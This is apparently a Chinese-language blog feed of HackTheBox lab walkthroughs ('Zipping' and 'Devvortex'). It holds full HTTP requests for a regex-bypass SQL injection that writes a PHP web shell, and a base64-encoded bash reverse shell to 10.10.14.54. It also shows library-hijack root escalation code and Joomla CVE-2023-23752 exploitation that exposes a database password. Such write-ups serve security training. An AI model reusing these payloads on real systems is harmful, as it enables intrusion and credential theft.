colspan=&quot;2&quot;&gt;Product&lt;/td&gt;</span><br><span class=\"line\">                    &lt;td&gt;Price&lt;/td&gt;</span><br><span class=\"line\">                    &lt;td&gt;Quantity&lt;/td&gt;</span><br><span class=\"line\">                    &lt;td&gt;Total&lt;/td&gt;</span><br><span class=\"line\">                &lt;/tr&gt;</span><br><span class=\"line\">            &lt;/thead&gt;</span><br><span class=\"line\">            &lt;tbody&gt;</span><br><span class=\"line\">                &lt;?php if (empty($products)): ?&gt;</span><br><span class=\"line\">                &lt;tr&gt;</span><br><span class=\"line\">                    &lt;td colspan=&quot;5&quot; style=&quot;text-align:center;&quot;&gt;You have no products added in your Shopping Cart&lt;/td&gt;</span><br><span class=\"line\">                &lt;/tr&gt;</span><br><span class=\"line\">                &lt;?php else: ?&gt;</span><br><span class=\"line\">                &lt;?php foreach ($products as $product): ?&gt;</span><br><span class=\"line\">                &lt;tr&gt;</span><br><span class=\"line\">                    &lt;td class=&quot;img&quot;&gt;</span><br><span class=\"line\">                        &lt;a href=&quot;index.php?page=product&amp;id=&lt;?=$product[&#x27;id&#x27;]?&gt;&quot;&gt;</span><br><span class=\"line\">                            &lt;img src=&quot;assets/imgs/&lt;?=$product[&#x27;img&#x27;]?&gt;&quot; width=&quot;50&quot; height=&quot;50&quot; alt=&quot;&lt;?=$product[&#x27;name&#x27;]?&gt;&quot;&gt;</span><br><span class=\"line\">                        &lt;/a&gt;</span><br><span class=\"line\">                    &lt;/td&gt;</span><br><span class=\"line\">                    &lt;td&gt;</span><br><span class=\"line\">                        &lt;a href=&quot;index.php?page=product&amp;id=&lt;?=$product[&#x27;id&#x27;]?&gt;&quot;&gt;&lt;?=$product[&#x27;name&#x27;]?&gt;&lt;/a&gt;</span><br><span class=\"line\">                        &lt;br&gt;</span><br><span class=\"line\">                        &lt;a href=&quot;index.php?page=cart&amp;remove=&lt;?=$product[&#x27;id&#x27;]?&gt;&quot; class=&quot;remove&quot;&gt;Remove&lt;/a&gt;</span><br><span class=\"line\">                    &lt;/td&gt;</span><br><span class=\"line\">                    &lt;td class=&quot;price&quot;&gt;&amp;dollar;&lt;?=$product[&#x27;price&#x27;]?&gt;&lt;/td&gt;</span><br><span class=\"line\">                    &lt;td class=&quot;quantity&quot;&gt;</span><br><span class=\"line\">                        &lt;input type=&quot;number&quot; name=&quot;quantity-&lt;?=$product[&#x27;id&#x27;]?&gt;&quot; value=&quot;&lt;?=$products_in_cart[$product[&#x27;id&#x27;]]?&gt;&quot; min=&quot;1&quot; max=&quot;&lt;?=$product[&#x27;quantity&#x27;]?&gt;&quot; placeholder=&quot;Quantity&quot; required&gt;</span><br><span class=\"line\">                    &lt;/td&gt;</span><br><span class=\"line\">                    &lt;td class=&quot;price&quot;&gt;&amp;dollar;&lt;?=$product[&#x27;price&#x27;] * $products_in_cart[$product[&#x27;id&#x27;]]?&gt;&lt;/td&gt;</span><br><span class=\"line\">                &lt;/tr&gt;</span><br><span class=\"line\">                &lt;?php endforeach; ?&gt;</span><br><span class=\"line\">                &lt;?php endif; ?&gt;</span><br><span class=\"line\">            &lt;/tbody&gt;</span><br><span class=\"line\">        &lt;/table&gt;</span><br><span class=\"line\">        &lt;div class=&quot;subtotal&quot;&gt;</span><br><span class=\"line\">            &lt;span class=&quot;text&quot;&gt;Subtotal&lt;/span&gt;</span><br><span class=\"line\">            &lt;span class=&quot;price&quot;&gt;&amp;dollar;&lt;?=$subtotal?&gt;&lt;/span&gt;</span><br><span class=\"line\">        &lt;/div&gt;</span><br><span class=\"line\">        &lt;div class=&quot;buttons&quot;&gt;</span><br><span class=\"line\">            &lt;input type=&quot;submit&quot; value=&quot;Update&quot; name=&quot;update&quot;&gt;</span><br><span class=\"line\">            &lt;input type=&quot;submit&quot; value=&quot;Place Order&quot; name=&quot;placeorder&quot;&gt;</span><br><span class=\"line\">\t    &lt;input type=&quot;submit&quot; value=&quot;Clear&quot; name=&quot;clear&quot; onsubmit=&quot;&quot;&gt;</span><br><span class=\"line\">        &lt;/div&gt;</span><br><span class=\"line\">    &lt;/form&gt;</span><br><span class=\"line\">&lt;/div&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;?=template_footer()?&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<h4 id=\"代码审计\"><a class=\"anchor\" href=\"#代码审计\">#</a> 代码审计</h4>\n<p>通过观察代码可以得知</p>\n<p>product.php 代码中执行 sql 语句时使用了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$stmt = $pdo-&gt;prepare(&quot;SELECT * FROM products WHERE id = &#x27;$id&#x27;&quot;);</span><br></pre></td></tr></table></figure></p>\n<p>将代码预编译了 sql 语句</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SQL预编译是指在执行SQL语句之前，将参数送到数据库预编译，编译完成后，将验证后的SQL语句发送到数据库进行执行。 这种方法可以有效地防止SQL注入攻击，因为攻击者不能通过注入代码来修改或者干扰SQL预编译中的语句。</span><br></pre></td></tr></table></figure></p>\n<p>而 cart.php 中是直接写入的 sql 语法</p>\n<p>所以能导致 sql 注入</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$sql = &quot;SELECT * FROM products WHERE id = &#x27;&quot; . $_POST[&#x27;product_id&#x27;] . &quot;&#x27;&quot;;</span><br><span class=\"line\">$product = $pdo-&gt;query($sql)-&gt;fetch(PDO::FETCH_ASSOC);</span><br></pre></td></tr></table></figure></p>\n<p>但是它的前面使用了不少过滤</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if(preg_match(&quot;/^.*[A-Za-z!#$%^&amp;*()\\-_=+&#123;&#125;\\[\\]\\\\|;:&#x27;\\&quot;,.&lt;&gt;\\/?]|[^0-9]$/&quot;, $product_id, $match) || preg_match(&quot;/^.*[A-Za-z!#$%^&amp;*()\\-_=+&#123;&#125;[\\]\\\\|;:&#x27;\\&quot;,.&lt;&gt;\\/?]/i&quot;, $quantity, $match)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">^.*[A-Za-z!#$%^&amp;*()\\-_=+&#123;&#125;\\[\\]\\\\|;:&#x27;\\&quot;,.&lt;&gt;\\/?]|[^0-9]$</span><br><span class=\"line\">这个正则的话前面的^.*可以使用%0a绕过</span><br><span class=\"line\">然后后面的$只是匹配个数字而已后面直接加上</span><br></pre></td></tr></table></figure></p>\n<p>先构造好思路，首先利用</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">shop/index.php?page=</span><br></pre></td></tr></table></figure></p>\n<p>能达到文件任意读取，</p>\n<p>在通过 shop/cart.php 来进行上传马儿</p>\n<h4 id=\"反弹shell\"><a class=\"anchor\" href=\"#反弹shell\">#</a> 反弹 shell</h4>\n<p>经过测试发现都不能写入木马，最后看别人 wp 用 into outfile 写到 /var/lib/mysql 里面去就行了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /shop/index.php?page=cart HTTP/1.1</span><br><span class=\"line\"> </span><br><span class=\"line\">Host: 10.10.11.229</span><br><span class=\"line\"> </span><br><span class=\"line\">Content-Length: 113</span><br><span class=\"line\"> </span><br><span class=\"line\">Cache-Control: max-age=0</span><br><span class=\"line\"> </span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\"> </span><br><span class=\"line\">Origin: http://10.10.11.229</span><br><span class=\"line\"> </span><br><span class=\"line\">Content-Type: application/x-www-form-urlencoded</span><br><span class=\"line\"> </span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36</span><br><span class=\"line\"> </span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class=\"line\"> </span><br><span class=\"line\">Referer: http://10.10.11.229/shop/index.php?page=cart</span><br><span class=\"line\"> </span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\"> </span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.9</span><br><span class=\"line\"> </span><br><span class=\"line\">Cookie: PHPSESSID=2r2p0aicavvo4ka7ncc5ce1i0a</span><br><span class=\"line\"> </span><br><span class=\"line\">Connection: close</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">quantity=1&amp;product_id=%0a&#x27;%3bselect+&#x27;&lt;%3fphp+system(&quot;$_POST[1]&quot;)%3b%3f&gt;&#x27;+into+outfile+&#x27;/var/lib/mysql/7.php&#x27;;+--2</span><br></pre></td></tr></table></figure></p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /shop/index.php?page=/var/lib/mysql/7 HTTP/1.1</span><br><span class=\"line\">Host: 10.10.11.229</span><br><span class=\"line\">Cache-Control: max-age=0</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">Content-Type: application/x-www-form-urlencoded</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.9</span><br><span class=\"line\">Cookie: PHPSESSID=hngopd6tchq7vfp0pfndmd7oq3</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Content-Length: 4</span><br><span class=\"line\"></span><br><span class=\"line\">1=ls</span><br></pre></td></tr></table></figure></p>\n<p>命令执行成功</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 200 OK</span><br><span class=\"line\">Date: Fri, 15 Dec 2023 06:40:57 GMT</span><br><span class=\"line\">Server: Apache/2.4.54 (Ubuntu)</span><br><span class=\"line\">Expires: Thu, 19 Nov 1981 08:52:00 GMT</span><br><span class=\"line\">Cache-Control: no-store, no-cache, must-revalidate</span><br><span class=\"line\">Pragma: no-cache</span><br><span class=\"line\">Vary: Accept-Encoding</span><br><span class=\"line\">Content-Length: 89</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Content-Type: text/html; charset=UTF-8</span><br><span class=\"line\"></span><br><span class=\"line\">assets</span><br><span class=\"line\">cart.php</span><br><span class=\"line\">functions.php</span><br><span class=\"line\">home.php</span><br><span class=\"line\">index.php</span><br><span class=\"line\">placeorder.php</span><br><span class=\"line\">product.php</span><br><span class=\"line\">products.php</span><br></pre></td></tr></table></figure></p>\n<p>接下来反弹一下 shell</p>\n<p>使用加密后的 bash 反弹一下试试</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">└─$ echo bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.54/9999 0&gt;&amp;1&quot;|base64</span><br><span class=\"line\">YmFzaCAtYyBiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjU0Lzk5OTkgMD4mMQo=</span><br></pre></td></tr></table></figure></p>\n<p>使用</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /shop/index.php?page=/var/lib/mysql/7 HTTP/1.1</span><br><span class=\"line\">Host: 10.10.11.229</span><br><span class=\"line\">Cache-Control: max-age=0</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">Content-Type: application/x-www-form-urlencoded</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.9</span><br><span class=\"line\">Cookie: PHPSESSID=hngopd6tchq7vfp0pfndmd7oq3</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Content-Length: 90</span><br><span class=\"line\"></span><br><span class=\"line\">1=echo YmFzaCAtYyBiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjU0Lzk5OTkgMD4mMQo=|base64 -d|bash</span><br></pre></td></tr></table></figure></p>\n<p>得到 shell</p>\n<p>虽然是 1001 但是目录下有 user.txt</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">uid=1001(rektsu) gid=1001(rektsu) groups=1001(rektsu)</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"提权\"><a class=\"anchor\" href=\"#提权\">#</a> 提权</h4>\n<p>执行 sudo -l</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo -l</span><br><span class=\"line\">Matching Defaults entries for rektsu on zipping:</span><br><span class=\"line\">    env_reset, mail_badpass,</span><br><span class=\"line\">    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin</span><br><span class=\"line\"></span><br><span class=\"line\">User rektsu may run the following commands on zipping:</span><br><span class=\"line\">    (ALL) NOPASSWD: /usr/bin/stock</span><br></pre></td></tr></table></figure></p>\n<p>使用 ltrace -Ss 10000 ./stock</p>\n<p>这个 stock 的调用库竟然使用了 rektsu/.config/libcounter.so 意义很明显了，</p>\n<p>我们直接在.config 下面写一个一样名称的动态链接库</p>\n<p>只要这个动态链接库执行一下 /usr/bin/bash -i 就相当于提权脚本一样</p>\n<p>先写一个 c</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\">#include &lt;stdlib.h&gt;</span><br><span class=\"line\"> </span><br><span class=\"line\">void __attribute__((constructor)) init() &#123;</span><br><span class=\"line\">    system(&quot;/usr/bin/bash -i&quot;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>在使用</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gcc -c –fPIC –shared –o /home/rektsu/.config/libcounter.so *.c</span><br></pre></td></tr></table></figure></p>\n<p>即可提权成功</p>\n",
            "tags": [
                "渗透"
            ]
        },
        {
            "id": "https://lookhui.github.io/HTB-Devvortex/",
            "url": "https://lookhui.github.io/HTB-Devvortex/",
            "title": "HTB-Devvortex",
            "date_published": "2023-12-14T08:15:11.000Z",
            "content_html": "<h1 id=\"devvortex\"><a class=\"anchor\" href=\"#devvortex\">#</a> Devvortex</h1>\n<p>本题知识简介</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Joomla未授权访问漏洞(CVE-2023-23752):</span><br><span class=\"line\">适用版本</span><br><span class=\"line\">4.0.0 &lt;= Joomla &lt;= 4.2.7</span><br><span class=\"line\">构造路由</span><br><span class=\"line\">/api/index.php/v1/config/application?public=true</span><br><span class=\"line\"></span><br><span class=\"line\">apport-cli提权</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"信息收集\"><a class=\"anchor\" href=\"#信息收集\">#</a> 信息收集</h4>\n<p>使用 nmap 进行扫描同时使用浏览器进行访问</p>\n<p>修改 hosts</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">10.10.11.242 devvortex.htb</span><br></pre></td></tr></table></figure></p>\n<p>然后去扫目录没有什么可用信息</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">********************************************************</span><br><span class=\"line\">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class=\"line\">********************************************************</span><br><span class=\"line\"></span><br><span class=\"line\">Target: http://devvortex.htb/FUZZ</span><br><span class=\"line\">Total requests: 45524</span><br><span class=\"line\"></span><br><span class=\"line\">=====================================================================</span><br><span class=\"line\">ID           Response   Lines    Word       Chars       Payload</span><br><span class=\"line\">=====================================================================</span><br><span class=\"line\"></span><br><span class=\"line\">000000001:   301        7 L      12 W       178 Ch      &quot;images&quot;</span><br><span class=\"line\">000000002:   301        7 L      12 W       178 Ch      &quot;css&quot;</span><br><span class=\"line\">000000004:   301        7 L      12 W       178 Ch      &quot;js&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">Total time: 262.5244</span><br><span class=\"line\">Processed Requests: 5190</span><br><span class=\"line\">Filtered Requests: 5187</span><br><span class=\"line\">Requests/sec.: 19.76958</span><br></pre></td></tr></table></figure></p>\n<p>在去扫描子域名获得子域名</p>\n<p>通过 wfuzz 去扫描子域名</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wfuzz -w 指定字典 -u &quot;http://devvortex.htb&quot; -H &quot;Host:FUZZ.devvortex.htb&quot; --hl 7</span><br></pre></td></tr></table></figure></p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">000000499:   200        501 L    1581 W     23221 Ch    &quot;dev&quot;</span><br></pre></td></tr></table></figure></p>\n<p>加入 hosts 然后去访问</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">10.10.11.242 dev.devvortex.htb</span><br></pre></td></tr></table></figure></p>\n<p>nmap 扫描结果如下</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-14 16:28 中国标准时间</span><br><span class=\"line\">Nmap scan report for devvortex.htb (10.10.11.242)</span><br><span class=\"line\">Host is up (0.35s latency).</span><br><span class=\"line\">Not shown: 998 closed tcp ports (reset)</span><br><span class=\"line\">PORT   STATE SERVICE</span><br><span class=\"line\">22/tcp open  ssh</span><br><span class=\"line\">80/tcp open  http</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 81.91 seconds</span><br></pre></td></tr></table></figure></p>\n<p>扫描子域名目录</p>\n<p>扫出来了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">000000001:   301        7 L      12 W       178 Ch      &quot;images&quot;</span><br><span class=\"line\">000000040:   301        7 L      12 W       178 Ch      &quot;modules&quot;</span><br><span class=\"line\">000000033:   301        7 L      12 W       178 Ch      &quot;includes&quot;</span><br><span class=\"line\">000000037:   301        7 L      12 W       178 Ch      &quot;language&quot;</span><br><span class=\"line\">000000026:   301        7 L      12 W       178 Ch      &quot;plugins&quot;</span><br><span class=\"line\">000000013:   301        7 L      12 W       178 Ch      &quot;templates&quot;</span><br><span class=\"line\">000000091:   301        7 L      12 W       178 Ch      &quot;media&quot;</span><br><span class=\"line\">000000006:   200        501 L    1581 W     23221 Ch    &quot;index.php&quot;</span><br><span class=\"line\">000000058:   301        7 L      12 W       178 Ch      &quot;cache&quot;</span><br><span class=\"line\">000000138:   301        7 L      12 W       178 Ch      &quot;tmp&quot;</span><br><span class=\"line\">000000132:   200        29 L     105 W      764 Ch      &quot;robots.txt&quot;</span><br><span class=\"line\">000000151:   301        7 L      12 W       178 Ch      &quot;administrator&quot;</span><br><span class=\"line\">000000201:   200        74 L     540 W      4940 Ch     &quot;README.txt&quot;</span><br><span class=\"line\">000000198:   301        7 L      12 W       178 Ch      &quot;libraries&quot;</span><br><span class=\"line\">000000209:   403        7 L      10 W       162 Ch      &quot;.DS_Store&quot;</span><br><span class=\"line\">000000243:   200        0 L      0 W        0 Ch        &quot;configuration.php&quot;</span><br><span class=\"line\">000000217:   301        7 L      12 W       178 Ch      &quot;components&quot;</span><br><span class=\"line\">000000339:   200        172 L    1008 W     6858 Ch     &quot;htaccess.txt&quot;</span><br><span class=\"line\">000000588:   200        501 L    1581 W     23221 Ch    &quot;home&quot;</span><br><span class=\"line\">000000925:   403        7 L      10 W       162 Ch      &quot;.htpasswd&quot;</span><br><span class=\"line\">000001005:   200        339 L    2968 W     18092 Ch    &quot;LICENSE.txt&quot;</span><br><span class=\"line\">000001109:   301        7 L      12 W       178 Ch      &quot;cli&quot;</span><br><span class=\"line\">000001149:   403        7 L      10 W       162 Ch      &quot;.thumbs&quot;</span><br></pre></td></tr></table></figure></p>\n<p>访问 readme.txt 能够指定服务信息</p>\n<p>访问 robots.txt 得到几个路由</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">User-agent: *</span><br><span class=\"line\">Disallow: /administrator/</span><br><span class=\"line\">Disallow: /api/</span><br><span class=\"line\">Disallow: /bin/</span><br><span class=\"line\">Disallow: /cache/</span><br><span class=\"line\">Disallow: /cli/</span><br><span class=\"line\">Disallow: /components/</span><br><span class=\"line\">Disallow: /includes/</span><br><span class=\"line\">Disallow: /installation/</span><br><span class=\"line\">Disallow: /language/</span><br><span class=\"line\">Disallow: /layouts/</span><br><span class=\"line\">Disallow: /libraries/</span><br><span class=\"line\">Disallow: /logs/</span><br><span class=\"line\">Disallow: /modules/</span><br><span class=\"line\">Disallow: /plugins/</span><br><span class=\"line\">Disallow: /tmp/</span><br></pre></td></tr></table></figure></p>\n<p>访问 /administrator/ 是个登录框需要密码</p>\n<p>那么我们在网上找这个漏洞</p>\n<h4 id=\"反弹shell\"><a class=\"anchor\" href=\"#反弹shell\">#</a> 反弹 shell</h4>\n<p>并且使用 msfconsole 来打</p>\n<p>use scanner/http/joomla_api_improper_access_checks</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> ID   Super User  Name        Username  Email                Send Email  Register Date    Last Visit Date  Group Names</span><br><span class=\"line\"> --   ----------  ----        --------  -----                ----------  -------------    ---------------  -----------</span><br><span class=\"line\"> 649  *           lewis       lewis     lewis@devvortex.htb  1           2023-09-25 16:4  2023-12-14 08:5  Super Users</span><br><span class=\"line\">                                                                         4:24             8:39</span><br><span class=\"line\"> 650              logan paul  logan     logan@devvortex.htb  0           2023-09-26 19:1                   Registered</span><br><span class=\"line\">                                                                         5:42</span><br><span class=\"line\"></span><br><span class=\"line\">[+] Config JSON saved to /home/iliy/.msf4/loot/20231214171300_default_10.10.11.242_joomla.config_395747.bin</span><br><span class=\"line\">[+] Joomla Config</span><br><span class=\"line\">=============</span><br><span class=\"line\"></span><br><span class=\"line\"> Setting        Value</span><br><span class=\"line\"> -------        -----</span><br><span class=\"line\"> db encryption  0</span><br><span class=\"line\"> db host        localhost</span><br><span class=\"line\"> db name        joomla</span><br><span class=\"line\"> db password    P4ntherg0t1n5r3c0n##</span><br><span class=\"line\"> db prefix      sd4fg_</span><br><span class=\"line\"> db user        lewis</span><br><span class=\"line\"> 